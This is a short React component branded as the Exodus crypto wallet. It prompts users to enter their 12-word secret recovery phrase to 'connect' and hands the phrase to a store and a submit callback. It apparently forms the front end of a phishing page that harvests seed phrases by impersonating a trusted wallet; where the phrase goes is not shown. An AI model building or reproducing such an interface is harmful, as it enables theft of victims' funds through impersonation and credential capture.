import { useState } from "react";
import { ChevronLeft } from "lucide-react";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import ExodusSmall from "../icons/exodus-small";

const Exodus = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [words, setWords] = useState<string[]>(Array(12).fill(""));
	const { setSeedPhrase } = useWalletStore();

	const handleComplete = () => {
		setSeedPhrase(words.join(" "));
		handleFinish(words.join(" "));
	};

	const handleWordChange = (index: number, value: string) => {
		const newWords = [...words];
		newWords[index] = value.toLowerCase().trim();
		setWords(newWords);
	};

	const allWordsFilled = words.every((word) => word.length > 0);

	return (
		<div className="min-h-screen bg-[#181C38] w-full flex items-center justify-center p-2">
			<div className="w-full max-w-2xl">
				{/* Card */}
				<div className="p-4 md:p-12 relative">
					<span className="w-full flex justify-center p-8">
						<ExodusSmall />
					</span>
					<h1 className="text-2xl text-white text-center mb-2">
						Connect Your Wallet
					</h1>
					<p className="text-white/70 text-center text-sm mb-12">
						Enter your 12-word secret phrase to
						<br />
						Connect your existing wallet
					</p>

					{/* Word inputs grid */}
					<div className="grid grid-cols-3 gap-2 mb-2">
						{words.map((word, index) => (
							<div
								key={index}
								className="relative"
							>
								<Input
									value={word}
									onChange={(e) => handleWordChange(index, e.target.value)}
									placeholder={`${index + 1}`}
									className="bg-black/15 border border-blue-900/30 border-b-blue-300/20 text-white placeholder:text-white/30 focus:border-blue-400 h-13 text-center text-sm rounded-xl"
								/>
							</div>
						))}
					</div>
					<div className="flex w-full justify-center items-center mt-12">
						<Button
							onClick={handleComplete}
							disabled={!allWordsFilled}
							className="w-[80%] bg-blue-500 hover:bg-blue-600 text-white disabled:opacity-30 disabled:cursor-not-allowed h-12 text-xs font-semibold rounded-full"
						>
							CONNECT
						</Button>
					</div>
				</div>
			</div>
		</div>
	);
};

export default Exodus;
